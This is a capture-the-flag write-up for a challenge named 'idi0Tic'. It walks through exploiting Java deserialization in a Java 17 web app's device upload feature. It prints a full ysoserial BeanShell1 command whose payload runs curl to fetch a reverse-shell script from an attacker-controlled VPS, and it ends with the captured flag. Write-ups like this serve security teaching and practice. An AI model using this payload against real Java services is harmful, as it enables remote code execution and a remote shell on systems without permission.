# idi0Tic


Attachment: [challenge.zip](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

## Writeup

From the Dockerfile, I can tell that this application is using Java 17 JDK.  



A simple login page greets me:  



Going through the provided source code, I can see valid credentials so I can login:  



Looking further in the source code, using Visual Studio Code with the [Snyk](https://docs.snyk.io/scm-ide-and-ci-cd-integrations/snyk-ide-plugins-and-extensions/visual-studio-code-extension) extension installed :wink:, it correctly identifies a  High Severity vulnerability due to Deserialization of Untrusted Data.  



After logging in, I can see an option to Add Device, among other options:  



The /upload endpoint is indeed the one doing the deserialization:  



I can also generate a .bin file:  



Which is just serialized data:  



When adding the device, I can import this .bin file and in Burp, I can see it is uploading it as base64 blob, just like the source code says:  



Under the Model folder, I can see the `Device.java` code is the only class that implements `Serializable` so this is definitely the endpoint/functionality we need to focus on to exploit the Java Deserialization.  



> [!IMPORTANT]  
> I spent quite a few hours troubleshooting and trying various methods. It got to be quite annoying as I was sure I was doing the correct thing but I couldn't get RCE. Finally I found this github issue raised on ysoserial having issues with Java 17. There is a lengthy discussion about needing to use specific flags and the arguments need to be in a slightly different order.

I was finally able to get RCE by using this syntax:

```bash

java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED   --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED  -jar ysoserial-all.jar BeanShell1 'curl VPS_IP:1337/r.sh -O'|base64 -w0

```

I'm using BeanShell1 because I noticed beanshell being used as a dependency in pom.xml with the same version mentioned by ysoserial:  



The first generates a base64 payload that when deserialized, uploads a bash reverse shell. Because java can be weird with piping and redirections, I simply run a second command to run the bash reverse shell.



flag{927868b13a72eef4b4ebd186140af680}

